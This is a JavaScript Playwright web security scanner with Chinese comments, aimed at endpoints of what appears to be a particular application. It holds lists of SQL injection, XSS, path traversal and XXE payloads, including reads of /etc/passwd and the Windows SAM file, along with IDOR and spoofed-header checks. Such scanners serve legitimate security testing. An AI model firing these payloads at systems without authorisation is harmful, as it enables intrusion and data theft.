// web-security-scanner/scripts/scan.js
// 基于 Playwright 的 Web 安全扫描脚本

const SECURITY_HEADERS = [
  'X-Frame-Options',
  'Content-Security-Policy',
  'Strict-Transport-Security',
  'X-Content-Type-Options',
  'X-XSS-Protection',
  'Referrer-Policy',
  'Permissions-Policy'
];

const COMPONENT_PATHS = [
  '/swagger-ui.html', '/swagger-ui/', '/v2/api-docs', '/v3/api-docs',
  '/actuator', '/actuator/health', '/actuator/env',
  '/druid', '/druid/index.html',
  '/.git/config', '/.env', '/config.json'
];

const SQL_PAYLOADS = [
  "' OR '1'='1", "1; SELECT * FROM users--", "1 UNION SELECT null--",
  "1' AND SLEEP(5)--", "1' AND BENCHMARK(10000000,SHA1('test'))--",
  "1' WAITFOR DELAY '0:0:5'--", "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--"
];

const XSS_PAYLOADS = [
  '<script>alert(1)</script>',
  '"><img src=x onerror=alert(1)>',
  "'-alert(1)-'",
  "{{7*7}}", "${7*7}", "<%= 7*7 %>"
];

const PATH_TRAVERSAL_PAYLOADS = [
  '../../../etc/passwd',
  '....//....//....//etc/passwd',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '..\\..\\..\\windows\\system32\\config\\sam'
];

class WebSecurityScanner {
  constructor(page, baseUrl, options = {}) {
    this.page = page;
    this.baseUrl = baseUrl;
    this.token = options.token || null;
    this.findings = [];
    this.testedEndpoints = new Set();
    this.wafRules = new Map();
  }

  // 添加发现
  addFinding(severity, title, details, evidence = '') {
    this.findings.push({
      severity,
      title,
      details,
      evidence,
      timestamp: new Date().toISOString()
    });
  }

  // 安全请求方法
  async safeFetch(url, options = {}) {
    try {
      const response = await this.page.evaluate(async ({ url, options }) => {
        const resp = await fetch(url, options);
        const text = await resp.text();
        let data;
        try { data = JSON.parse(text); } catch { data = text; }
        return {
          status: resp.status,
          headers: Object.fromEntries(resp.headers.entries()),
          size: text.length,
          data
        };
      }, { url, options });

      // 检测 WAF
      if (response.status === 403) {
        const ruleId = response.headers['x-waf-rule-id'] || 'unknown';
        this.wafRules.set(ruleId, (this.wafRules.get(ruleId) || 0) + 1);
      }

      return response;
    } catch (e) {
      return { status: 0, error: e.message };
    }
  }

  // 测试公开端点 (未认证)
  async testPublicEndpoints() {
    const endpoints = [
      '/usercenter-api/free/sysconfig/get-all-free-config',
      '/eurbanpro/version.json',
      '/usercenter-api/free/login/create-code-securely'
    ];

    for (const ep of endpoints) {
      const url = this.baseUrl + ep;
      const resp = await this.safeFetch(url);
      
      if (resp.status === 200 && ep.includes('sysconfig')) {
        this.addFinding('HIGH', '未授权配置泄露',
          `${ep} 无需认证返回系统配置`, JSON.stringify(resp.data).substring(0, 500));
      }
      if (resp.status === 200 && ep.includes('version')) {
        this.addFinding('MEDIUM', '版本信息泄露',
          `${ep} 泄露版本和 git commit 信息`);
      }
    }
  }

  // 检查安全头
  async checkSecurityHeaders() {
    const resp = await this.safeFetch(this.baseUrl);
    const missing = SECURITY_HEADERS.filter(h => !resp.headers[h.toLowerCase()]);
    
    if (missing.length > 0) {
      this.addFinding('MEDIUM', '安全头缺失',
        `缺少以下安全头: ${missing.join(', ')}`);
    }
    
    // CORS 检查
    if (resp.headers['access-control-allow-origin'] === '*') {
      this.addFinding('MEDIUM', 'CORS 配置过宽',
        'Access-Control-Allow-Origin 为 *');
    }
  }

  // 测试组件暴露
  async testComponentExposure() {
    for (const path of COMPONENT_PATHS) {
      const url = this.baseUrl + path;
      const resp = await this.safeFetch(url);
      
      if (resp.status === 200) {
        this.addFinding('MEDIUM', '组件暴露',
          `${path} 可访问`, `Status: ${resp.status}`);
      }
    }
  }

  // 测试已认证端点
  async testAuthenticatedEndpoints() {
    const endpoints = [
      '/usercenter-api/unity/org/human/get-current-human-info',
      '/usercenter-api/unity/org/role/list',
      '/usercenter-api/unity/websocket/servercode',
      '/eurbanpro-api/unity/msg/group/list',
      '/eurbanpro-api/unity/im/exchange-token'
    ];

    for (const ep of endpoints) {
      const url = this.baseUrl + ep;
      const resp = await this.safeFetch(url, {
        headers: { 'Authorization': `Bearer ${this.token}` }
      });
      
      if (resp.status === 200) {
        if (ep.includes('role/list')) {
          this.addFinding('HIGH', '角色信息泄露',
            `${ep} 返回系统全部角色`, `Size: ${resp.size}B`);
        }
        if (ep.includes('human/get-current')) {
          this.addFinding('HIGH', '用户信息泄露',
            `${ep} 泄露用户手机号等敏感信息`);
        }
        if (ep.includes('websocket/servercode')) {
          this.addFinding('MEDIUM', '验证码泄露',
            `${ep} 返回 WebSocket 验证码`);
        }
        if (ep.includes('im/exchange-token')) {
          this.addFinding('HIGH', 'IM Token 长期有效',
            'IM Token 有效期 3 个月');
        }
      }
    }
  }

  // SQL 注入测试
  async testSQLInjection(endpoints) {
    for (const ep of endpoints) {
      for (const payload of SQL_PAYLOADS) {
        const url = `${this.baseUrl}${ep}?id=${encodeURIComponent(payload)}`;
        const resp = await this.safeFetch(url);
        
        if (resp.status === 200) {
          // 布尔盲注检测
          const respTrue = await this.safeFetch(`${this.baseUrl}${ep}?id=1 AND 1=1`);
          const respFalse = await this.safeFetch(`${this.baseUrl}${ep}?id=1 AND 1=2`);
          
          if (respTrue.size !== respFalse.size) {
            this.addFinding('HIGH', 'SQL 注入 (布尔盲注)',
              `${ep} 存在布尔盲注`, `Payload: ${payload}`);
          }
        }
      }
    }
  }

  // XSS 测试
  async testXSS(endpoints) {
    for (const ep of endpoints) {
      for (const payload of XSS_PAYLOADS) {
        const url = `${this.baseUrl}${ep}?q=${encodeURIComponent(payload)}`;
        const resp = await this.safeFetch(url);
        
        if (resp.status === 200 && resp.data && resp.data.includes(payload)) {
          this.addFinding('HIGH', '反射型 XSS',
            `${ep} 反射用户输入`, `Payload: ${payload}`);
        }
      }
    }
  }

  // 路径遍历测试
  async testPathTraversal() {
    const endpoints = ['/file/download', '/file/import', '/template/get'];
    
    for (const ep of endpoints) {
      for (const payload of PATH_TRAVERSAL_PAYLOADS) {
        const url = `${this.baseUrl}${ep}?path=${encodeURIComponent(payload)}`;
        const resp = await this.safeFetch(url);
        
        if (resp.status === 200) {
          this.addFinding('HIGH', '路径遍历',
            `${ep} 存在路径遍历`, `Payload: ${payload}`);
        }
      }
    }
  }

  // 权限提升测试
  async testPrivilegeEscalation() {
    // IDOR 测试
    const idorEndpoints = [
      '/usercenter-api/unity/org/human/get?id=',
      '/usercenter-api/unity/org/role/get?id='
    ];
    
    for (const ep of idorEndpoints) {
      for (const id of ['2', '3', '100', 'admin']) {
        const url = this.baseUrl + ep + id;
        const resp = await this.safeFetch(url, {
          headers: { 'Authorization': `Bearer ${this.token}` }
        });
        
        if (resp.status === 200 && resp.data && !resp.data.includes('error')) {
          this.addFinding('HIGH', 'IDOR 漏洞',
            `${ep}${id} 可访问其他用户数据`);
        }
      }
    }

    // 伪造头测试
    const fakeHeaders = [
      { 'X-User-Id': '2' },
      { 'X-Tenant-Id': 'admin' },
      { 'X-Role-Id': '1' }
    ];
    
    for (const headers of fakeHeaders) {
      const url = this.baseUrl + '/usercenter-api/unity/org/human/get-current-human-info';
      const resp = await this.safeFetch(url, {
        headers: { 'Authorization': `Bearer ${this.token}`, ...headers }
      });
      
      if (resp.status === 200) {
        // 检查是否返回了不同用户的数据
        this.addFinding('MEDIUM', '潜在提权风险',
          `伪造头 ${JSON.stringify(headers)} 未被拒绝`);
      }
    }
  }

  // 反序列化/XXE 测试
  async testDeserialization() {
    const payloads = [
      { endpoint: '/api/deserialize', body: 'O:12:"VulnerableClass":0:{}' },
      { endpoint: '/api/xml', body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' }
    ];
    
    for (const { endpoint, body } of payloads) {
      const url = this.baseUrl + endpoint;
      const resp = await this.safeFetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/xml' },
        body
      });
      
      if (resp.status === 200) {
        this.addFinding('HIGH', '反序列化/XXE 漏洞',
          `${endpoint} 接受危险输入`);
      }
    }
  }

  // 主扫描流程
  async runFullScan() {
    console.log('🔍 开始安全扫描...');
    
    // 未认证测试
    console.log('📋 测试公开端点...');
    await this.testPublicEndpoints();
    
    console.log('🔒 检查安全头...');
    await this.checkSecurityHeaders();
    
    console.log('🌐 测试组件暴露...');
    await this.testComponentExposure();
    
    // 已认证测试 (如果有 Token)
    if (this.token) {
      console.log('🔐 测试已认证端点...');
      await this.testAuthenticatedEndpoints();
      
      console.log('💉 测试 SQL 注入...');
      await this.testSQLInjection([
        '/eurbanpro-api/unity/msg/group/list',
        '/usercenter-api/unity/org/role/list'
      ]);
      
      console.log('📜 测试 XSS...');
      await this.testXSS(['/eurbanpro/api/search']);
      
      console.log('📁 测试路径遍历...');
      await this.testPathTraversal();
      
      console.log('⬆️ 测试权限提升...');
      await this.testPrivilegeEscalation();
      
      console.log('💥 测试反序列化...');
      await this.testDeserialization();
    }
    
    return {
      findings: this.findings,
      wafRules: Object.fromEntries(this.wafRules),
      summary: {
        high: this.findings.filter(f => f.severity === 'HIGH').length,
        medium: this.findings.filter(f => f.severity === 'MEDIUM').length,
        low: this.findings.filter(f => f.severity === 'LOW').length,
        pass: 18 - this.findings.length
      }
    };
  }
}

// 生成报告
function generateReport(scanResult, targetUrl) {
  const { findings, wafRules, summary } = scanResult;
  
  let report = `# ${targetUrl} 安全扫描报告\n\n`;
  report += `## 扫描概览\n`;
  report += `- 目标: ${targetUrl}\n`;
  report += `- 时间: ${new Date().toLocaleString()}\n`;
  report += `- 发现: 🔴 ${summary.high} HIGH | 🟠 ${summary.medium} MEDIUM | 🟡 ${summary.low} LOW\n\n`;
  
  report += `## 发现汇总\n\n`;
  
  const severityOrder = ['HIGH', 'MEDIUM', 'LOW'];
  for (const severity of severityOrder) {
    const items = findings.filter(f => f.severity === severity);
    if (items.length > 0) {
      const icon = severity === 'HIGH' ? '🔴' : severity === 'MEDIUM' ? '🟠' : '🟡';
      report += `### ${icon} ${severity} 级别\n\n`;
      items.forEach((item, i) => {
        report += `${i + 1}. **${item.title}**\n`;
        report += `   - ${item.details}\n`;
        if (item.evidence) report += `   - 证据: ${item.evidence}\n`;
        report += '\n';
      });
    }
  }
  
  if (Object.keys(wafRules).length > 0) {
    report += `## WAF 规则\n\n`;
    for (const [rule, count] of Object.entries(wafRules)) {
      report += `- Rule ${rule}: ${count} 次拦截\n`;
    }
  }
  
  return report;
}

// 导出
if (typeof module !== 'undefined') {
  module.exports = { WebSecurityScanner, generateReport };
}
